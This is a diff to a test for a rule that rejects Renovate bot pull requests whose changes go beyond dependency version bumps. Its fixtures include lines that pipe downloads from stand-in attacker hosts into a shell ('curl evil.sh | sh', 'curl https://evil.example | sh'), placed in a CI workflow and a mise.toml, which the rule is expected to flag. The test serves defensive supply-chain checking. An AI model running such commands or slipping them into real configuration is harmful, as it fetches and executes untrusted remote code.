@@ -42,11 +42,13 @@ test('a Renovate diff that changes a script, code or a step fails the bot rule',
       { filename: 'tools/x.ts', patch: '+x' },
       { filename: '.github/workflows/ci.yml', patch: '+      - run: curl evil.sh | sh' },
       { filename: 'mise.toml' },
+      { filename: 'mise.toml', patch: '+run = "curl https://evil.example | sh"' },
     ]),
   ).toEqual([
     'package.json changes more than a version: "build": "vite build"',
     'tools/x.ts is not a dependency file.',
     '.github/workflows/ci.yml changes more than a version: - run: curl evil.sh | sh',
     'mise.toml has no diff to check.',
+    'mise.toml changes more than a version: run = "curl https://evil.example | sh"',
   ]);
 });
